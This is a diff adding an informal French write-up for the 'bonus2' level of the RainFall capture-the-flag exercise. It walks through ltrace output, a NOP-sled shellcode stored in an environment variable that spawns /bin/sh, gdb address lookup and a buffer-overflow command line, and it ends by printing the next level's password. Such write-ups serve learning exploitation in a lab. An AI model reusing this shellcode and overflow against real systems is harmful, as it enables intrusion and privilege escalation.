@@ -1,0 +1,51 @@
+de retour apres 20 jours de stopage je suis en plein stage mais j'ai fini tous mon boulot
+du coup on commence par lancer l'ex il ne ce passe rien je continue aussi par le
+gbd 
+le info function
+et le disas main
+je suis rouiller donc flemme de lire l'asm
+je le
+scp -P 4242 bonus2@127.0.0.1:~/bonus2 bonus2/
+et je lance directement ghidra pour lire le code
+et la je vois qu'il faut 3 arg pour lancer l'ex le con
+du coup je lance avec ltrace et je vois ca
+
+
+bonus2@RainFall:~$ ltrace ./bonus2 hello he
+__libc_start_main(0x8048529, 3, 0xbffff7e4, 0x8048640, 0x80486b0 <unfinished ...>
+strncpy(0xbffff6e0, "hello", 40)  = 0xbffff6e0
+strncpy(0xbffff708, "he", 32)     = 0xbffff708
+getenv("LANG")                    = "en_US.UTF-8"
+memcmp(0xbfffff1f, 0x804873d, 2, 0xb7fff918, 0) = -1
+memcmp(0xbfffff1f, 0x8048740, 2, 0xb7fff918, 0) = -1
+strcat("Hello ", "hello")         = "Hello hello"
+puts("Hello hello"Hello hello
+)               = 12
++++ exited (status 12) +++
+bonus2@RainFall:~$ 
+
+bon bon du coup ce que j'avais entendu quand j'ai corriger un rain c qu'il y avait une technique un peu trop forte
+
+bon je pensais pas que ca allait etre aussi simple ca me fait mal au coeur
+
+export EXPLOIT=$(python -c "print '\x90' * 300 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'")
+
+pour trouver l'addresse il faut break main
+r
+et (gdb) x/s *((char **)environ)
+on a 0xbffff7c7
+x/32wx 0xbffff7c7
+0xbffff7c7:     0x4c505845      0x3d54494f      0x90909090      0x90909090
+0xbffff7d7:     0x90909090      0x90909090      0x90909090      0x90909090
+
+donc on va travailler avec 0xbffff7d7
+
+./bonus2 $(python -c "print '\xd7\xf7\xff\xbf' * 40") $(python -c "print 'B' * 26")
+
+on break les 40 buffer et on mets le bin dans le second et hop la magie et faite
+
+$ cat /home/user/bonus3/.pass    
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+merci pour ca thallard parcontre pls j'espere que pour le dernier ca va pas marcher mais pour le fun je vais juste try l'exploit et rien faire d'autre 
+
